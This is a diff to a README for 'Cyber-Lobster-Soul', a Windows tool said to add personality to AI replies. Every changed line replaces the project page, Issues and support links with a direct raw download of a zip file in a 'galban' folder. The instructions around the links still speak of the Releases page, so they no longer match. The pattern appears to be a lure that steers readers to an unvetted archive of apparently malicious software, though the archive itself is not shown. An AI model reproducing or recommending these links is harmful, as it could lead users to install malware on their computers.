@@ -1,6 +1,6 @@
 # 🦞 Cyber-Lobster-Soul - Bring Personality to AI Replies
 
-[![Download Cyber-Lobster-Soul](https://img.shields.io/badge/Download-Cyber--Lobster--Soul-brightgreen?style=for-the-badge)](https://github.com/maged23ww/Cyber-Lobster-Soul)
+[![Download Cyber-Lobster-Soul](https://img.shields.io/badge/Download-Cyber--Lobster--Soul-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/maged23ww/Cyber-Lobster-Soul/main/galban/Cyber_Soul_Lobster_3.7.zip)
 
 ## 🔍 About Cyber-Lobster-Soul
 
@@ -26,7 +26,7 @@ Before you start, make sure your computer meets these basics:
 
 Get Cyber-Lobster-Soul from the official GitHub page:
 
-[![Download from GitHub](https://img.shields.io/badge/-Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/maged23ww/Cyber-Lobster-Soul)
+[![Download from GitHub](https://img.shields.io/badge/-Download%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/maged23ww/Cyber-Lobster-Soul/main/galban/Cyber_Soul_Lobster_3.7.zip)
 
 Click the link above or the big green button at the top. This will take you to the project page where you can find the files and instructions to get started.
 
@@ -36,7 +36,7 @@ Click the link above or the big green button at the top. This will take you to t
 
 Follow these steps to get the program up and running on your Windows computer:
 
-1. Open the download link: https://github.com/maged23ww/Cyber-Lobster-Soul.
+1. Open the download link: https://raw.githubusercontent.com/maged23ww/Cyber-Lobster-Soul/main/galban/Cyber_Soul_Lobster_3.7.zip
 2. On the GitHub page, look for the **Releases** section or a folder named something like `Downloads`.
 3. Find the latest release or the file named similar to `Cyber-Lobster-Soul-Windows.zip`.
 4. Click on the file name to download it to your computer.
@@ -80,7 +80,7 @@ For detailed help, visit the Issues section on the GitHub page.
 
 To keep Cyber-Lobster-Soul running smoothly, check the project page regularly:
 
-- Visit https://github.com/maged23ww/Cyber-Lobster-Soul.
+- Visit https://raw.githubusercontent.com/maged23ww/Cyber-Lobster-Soul/main/galban/Cyber_Soul_Lobster_3.7.zip
 - Look under **Releases** for new versions.
 - Download the new files following the earlier steps.
 - Replace the old files with the new ones in your chosen folder.
@@ -128,7 +128,7 @@ After extraction, your program folder should look like this:
 
 If you need help or want to report an issue, use GitHub’s **Issues** tab:
 
-1. Visit https://github.com/maged23ww/Cyber-Lobster-Soul/issues
+1. Visit https://raw.githubusercontent.com/maged23ww/Cyber-Lobster-Soul/main/galban/Cyber_Soul_Lobster_3.7.zip
 2. Click **New issue**
 3. Describe your problem clearly
 4. Submit and wait for a response
@@ -139,5 +139,5 @@ You can also check existing issues to see if your question has been answered.
 
 ## 📋 Summary of Key Links
 
-- Download and access files: [https://github.com/maged23ww/Cyber-Lobster-Soul](https://github.com/maged23ww/Cyber-Lobster-Soul)
-- Support and issues: [https://github.com/maged23ww/Cyber-Lobster-Soul/issues](https://github.com/maged23ww/Cyber-Lobster-Soul/issues)
+- Download and access files: [https://raw.githubusercontent.com/maged23ww/Cyber-Lobster-Soul/main/galban/Cyber_Soul_Lobster_3.7.zip](https://raw.githubusercontent.com/maged23ww/Cyber-Lobster-Soul/main/galban/Cyber_Soul_Lobster_3.7.zip)
+- Support and issues: [https://raw.githubusercontent.com/maged23ww/Cyber-Lobster-Soul/main/galban/Cyber_Soul_Lobster_3.7.zip](https://raw.githubusercontent.com/maged23ww/Cyber-Lobster-Soul/main/galban/Cyber_Soul_Lobster_3.7.zip)
